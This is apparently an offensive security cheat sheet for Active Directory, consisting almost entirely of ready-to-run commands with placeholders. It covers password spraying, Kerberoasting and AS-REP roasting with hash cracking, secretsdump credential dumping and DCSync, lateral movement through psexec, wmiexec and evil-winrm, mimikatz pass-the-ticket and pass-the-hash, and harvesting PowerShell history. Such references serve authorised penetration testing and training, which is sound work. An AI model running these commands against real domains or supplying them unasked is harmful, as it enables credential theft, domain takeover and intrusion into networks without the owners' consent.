# AD quick reference

Placeholders: `TARGET` `TARGETS` `DC` `DOMAIN` `USER` `PASS` `NTHASH`

## Auth test / spray

```bash
nxc smb TARGET -u USER -p PASS
nxc smb TARGETS -u USER -p PASS --continue-on-success
nxc smb TARGETS -u USER -H NTHASH --continue-on-success
nxc winrm TARGET -u USER -p PASS
nxc winrm TARGET -u USER -H NTHASH
nxc smb TARGETS -u Administrator -d '.' -H NTHASH --continue-on-success
```

## Kerberos prep

```bash
echo "DC_IP dc.DOMAIN DOMAIN" | sudo tee -a /etc/hosts
timedatectl set-ntp 0 && sudo ntpdate DC_IP
export KRB5CCNAME=/tmp/ticket.ccache
```

## Roast

```bash
impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC -request -outputfile tgs.txt
impacket-GetNPUsers DOMAIN/USER:PASS -request -dc-ip DC -format hashcat -outputfile asrep.txt
hashcat -m 13100 tgs.txt wordlist.txt
hashcat -m 18200 asrep.txt wordlist.txt
```

## Dump / DCSync

```bash
impacket-secretsdump DOMAIN/USER:PASS@TARGET
impacket-secretsdump -hashes :NTHASH DOMAIN/USER@TARGET
impacket-secretsdump -just-dc DOMAIN/DA:PASS@DC
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

## Lateral

```bash
impacket-psexec DOMAIN/USER:PASS@TARGET
impacket-psexec -hashes :NTHASH DOMAIN/USER@TARGET
impacket-wmiexec -hashes :NTHASH DOMAIN/USER@TARGET
impacket-psexec -k -no-pass DOMAIN/USER@HOST.DOMAIN -dc-ip DC
evil-winrm -i TARGET -u USER -p PASS
evil-winrm -i TARGET -u USER -H NTHASH
```

## Tickets

```bash
impacket-ticketConverter ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache
```

```text
mimikatz # kerberos::ptt ticket.kirbi
mimikatz # sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:NTHASH /run:powershell.exe
```

## History gold

```powershell
type (Get-PSReadlineOption).HistorySavePath
```

Full flow: [../05-active-directory/decision-flow.md](../05-active-directory/decision-flow.md)
